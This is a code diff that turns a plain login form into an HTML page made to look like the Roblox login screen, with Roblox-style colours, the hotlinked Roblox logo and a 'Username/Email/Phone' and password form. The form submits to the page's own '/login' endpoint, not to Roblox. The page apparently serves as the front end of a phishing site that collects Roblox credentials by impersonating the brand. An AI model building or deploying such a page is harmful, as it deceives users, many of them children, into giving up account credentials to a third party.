@@ -1,5 +1,72 @@
-<form action="/login" method="POST">
-    <input type="text" name="username" placeholder="Username" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Log In</button>
-</form>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Roblox</title>
+    <style>
+        body {
+            font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #F2F4F5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            width: 400px;
+            text-align: center;
+        }
+        .roblox-logo {
+            width: 200px;
+            margin-bottom: 20px;
+        }
+        h2 { font-size: 20px; margin-bottom: 20px; color: #444; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #B8B8B8;
+            border-radius: 4px;
+            box-sizing: border-box;
+            background-color: #F2F4F5;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0084FF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #0074E0; }
+        .footer-links { margin-top: 20px; font-size: 13px; color: #0084FF; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_logo_with_wordmark.svg/1200px-Roblox_player_logo_with_wordmark.svg.png" alt="Roblox" class="roblox-logo">
+    <h2>Login to Roblox</h2>
+    
+    <form action="/login" method="POST">
+        <input type="text" name="username" placeholder="Username/Email/Phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+
+    <div class="footer-links">
+        <p>Forgot Password or Username?</p>
+    </div>
+</div>
+
+</body>
+</html>
